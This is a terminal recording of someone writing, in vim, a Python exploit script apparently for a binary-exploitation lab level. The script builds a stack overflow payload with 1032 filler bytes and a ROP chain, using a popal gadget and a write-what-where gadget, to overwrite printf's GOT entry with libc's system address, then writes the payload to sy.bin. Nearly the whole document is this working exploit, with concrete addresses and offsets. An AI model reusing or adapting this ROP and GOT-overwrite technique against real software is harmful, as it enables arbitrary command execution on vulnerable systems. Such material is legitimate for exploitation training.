[17.098, "o", "\u001b[?25l\u001b[32;73Hi\u001b[1;1H\u001b[32;73H \u001b[1;1H\u001b[32;1H\u001b[1m-- INSERT --\u001b[m\u001b[32;14H\u001b[K\u001b[32;83H0,1\u001b[11CAll\u001b[1;1H\u001b[?25h\u001b[?25l\u001b[34m#!/usr/bin/env python3\u001b[m\u001b[2;1H\u001b[K\u001b[32;83H\u001b[K\u001b[32;83H2,1\u001b[11CAll\u001b[2;1H\u001b[?25h\u001b[?25l\u001b[34m# build12 - the L12 exploit payload:\u001b[m\u001b[3;1H\u001b[K\u001b[32;83H3\u001b[3;1H\u001b[?25h\u001b[?25l\u001b[34m#   printf@GOT <- system@libc  (one 4-byte GOT write)\u001b[m\u001b[4;1H\u001b[K\u001b[32;83H4\u001b[4;1H\u001b[?25h\u001b[?25l\u001b[34m# The ROP (all fixed addresses, no stack addresses - env-independent):\u001b[m\u001b[5;1H\u001b[K\u001b[32;83H5\u001b[5;1H\u001b[?25h\u001b[?25l\u001b[34m#   1032 'A' filler       (unsafecode's buf[1032])\u001b[m\u001b[6;1H\u001b[K\u001b[32;83H6\u001b[6;1H\u001b[?25h\u001b[?25l\u001b[34m#   saved ebp             (readable scratch)\u001b[m\u001b[7;1H\u001b[K\u001b[32;83H7\u001b[7;1H\u001b[?25h\u001b[?25l\u001b[34m#   popal; cld; ret       (loads the registers from the stack)\u001b[m\u001b[8;1H\u001b[K\u001b[32;83H8\u001b[8;1H\u001b[?25h\u001b[?25l\u001b[34m#   6 filler dwords       (edi esi ebp esp(skip) ebx edx - all readable)\u001b[m\u001b[9;1H\u001b[K\u001b[32;83H9\u001b[9;1H\u001b[?25h\u001b[?25l\u001b[34m#   ecx = system@libc     (the VALUE written)\u001b[m\u001b[10;1H\u001b[K\u001b[32;83H10,1\u001b[10;1H\u001b[?25h\u001b[?25l\u001b[34m#   eax = printf@GOT      (the DESTINATION)\u001b[m\u001b[11;1H\u001b[K\u001b[32;84H1\u001b[11;1H\u001b[?25h\u001b[?25l\u001b[34m#   mov [eax],ecx; ret    (the write-what-where, libc+0x3caee)\u001b[m\u001b[12;1H\u001b[K\u001b[32;84H2\u001b[12;1H\u001b[?25h\u001b[?25l\u001b[34m#   park: safecode's loop (keeps main alive; the thread hits the patch)\u001b[m\u001b[13;1H\u001b[K\u001b[32;84H3\u001b[13;1H\u001b[?25h\u001b[?25l\u001b[34m# libc base 0xf7d6d000 (leaked live by the parking-loop trick: park with\u001b[m\u001b[14;1H\u001b[K\u001b[32;84H4\u001b[14;1H\u001b[?25h\u001b[?25l\u001b[34m# [ebp-0xc]=sleep@GOT and the loop prints its resolved value).\u001b[m\u001b[15;1H\u001b[K\u001b[32;84H5\u001b[15;1H\u001b[?25h\u001b[?25l\u001b[35mimport\u001b[m struct\u001b[16;1H\u001b[K\u001b[32;84H6\u001b[16;1H\u001b[?25h\u001b[?25lbase = \u001b[31m0xf7d6d000\u001b[m\u001b[17;1H\u001b[K\u001b[32;84H7\u001b[17;1H\u001b[?25h\u001b[?25lsystem = base + \u001b[31m0x53ce0\u001b[m\u001b[8C\u001b[34m# system@libc\u001b[m\u001b[18;1H\u001b[K\u001b[32;84H8\u001b[18;1H\u001b[?25h\u001b[?25lwww = base + \u001b[31m0x3caee\u001b[m\u001b[11C\u001b[34m# mov [eax],ecx; ret\u001b[m\u001b[19;1H\u001b[K\u001b[32;84H9\u001b[19;1H\u001b[?25h\u001b[?25lF = \u001b[31m0x804c030\u001b[m\u001b[18C\u001b[34m# readable+writable scratch (bss, stdout ptr)\u001b[m\u001b[20;1H\u001b[K\u001b[32;83H20\u001b[20;1H\u001b[?25h\u001b[?25lP  = \u001b[31mb'A'\u001b[m*\u001b[31m1032\u001b[m\u001b[21;1H\u001b[K\u001b[32;84H1\u001b[21;1H\u001b[?25h\u001b[?25lP += struct.pack(\u001b[31m'<I'\u001b[m, F)      \u001b[34m# saved ebp\u001b[m\u001b[22;1H\u001b[K\u001b[32;84H2\u001b[22;1H\u001b[?25h\u001b[?25lP += struct.pack(\u001b[31m'<I'\u001b[m, \u001b[31m0x804931d\u001b[m)   \u001b[34m# popal; cld; ret\u001b[m\u001b[23;1H\u001b[K\u001b[32;84H3\u001b[23;1H\u001b[?25h\u001b[?25lP += struct.pack(\u001b[31m'<I'\u001b[m, F)*\u001b[31m6\u001b[m\u001b[9C\u001b[34m# edi esi ebp esp(skip) ebx edx\u001b[m\u001b[24;1H\u001b[K\u001b[32;84H4\u001b[24;1H\u001b[?25h\u001b[?25lP += struct.pack(\u001b[31m'<I'\u001b[m, system)      \u001b[34m# ecx = system@libc\u001b[m\u001b[25;1H\u001b[K\u001b[32;84H5\u001b[25;1H\u001b[?25h\u001b[?25lP += struct.pack(\u001b[31m'<I'\u001b[m, \u001b[31m0x804c004\u001b[m)   \u001b[34m# eax = printf@GOT\u001b[m\u001b[26;1H\u001b[K\u001b[32;84H6\u001b[26;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[25;1HP += struct.pack(\u001b[31m'<I'\u001b[m, www)\u001b[9C\u001b[34m# mov [eax],ecx; ret\u001b[m\u001b[26;1H\u001b[K\u001b[31;1H\u001b[1m\u001b[34m~                                                                                                   \u001b[m\u001b[32;83H\u001b[K\u001b[32;83H27,1\u001b[10CBot\u001b[26;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[25;1HP += struct.pack(\u001b[31m'<I'\u001b[m, \u001b[31m0x8049260\u001b[m)   \u001b[34m# park in safecode's loop\u001b[m\u001b[26;1H\u001b[K\u001b[31;1H\u001b[1m\u001b[34m~                                                                                                   \u001b[m\u001b[32;83H\u001b[K\u001b[32;83H28,1\u001b[10CBot\u001b[26;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[25;1H\u001b[33massert\u001b[m \u001b[31mb'\u001b[m\u001b[35m\\x00\u001b[m\u001b[31m'\u001b[m \u001b[33mnot\u001b[m \u001b[33min\u001b[m P\u001b[26;1H\u001b[K\u001b[31;1H\u001b[1m\u001b[34m~                                                                                                   \u001b[m\u001b[32;83H\u001b[K\u001b[32;83H29,1\u001b[10CBot\u001b[26;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[25;1H\u001b[36mopen\u001b[m(\u001b[31m'sy.bin'\u001b[m,\u001b[31m'wb'\u001b[m).write(P)\u001b[26;1H\u001b[K\u001b[31;1H\u001b[1m\u001b[34m~                                                                                                   \u001b[m\u001b[32;83H\u001b[K\u001b[32;83H30,1\u001b[10CBot\u001b[26;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[25;1H\u001b[36mprint\u001b[m(\u001b[31m\"sy.bin\"\u001b[m, \u001b[36mlen\u001b[m(P))\u001b[26;1H\u001b[K\u001b[31;1H\u001b[1m\u001b[34m~                                                                                                   \u001b[m\u001b[32;83H\u001b[K\u001b[32;83H31,1\u001b[10CBot\u001b[26;1H\u001b[?25h\u001b[32;1H\u001b[K\u001b[26;1H\u001b[?25l\u001b[32;73H^[\u001b[26;1H\u001b[32;73H  \u001b[26;1H\u001b[32;83H31,0-1\u001b[8CBot\u001b[26;1H\u001b[?25h\u001b[?25l\u001b[32;83H\u001b[K\u001b[32;1H:wq\r\u001b[?1006;1000l\u001b[?1002l\u001b["]
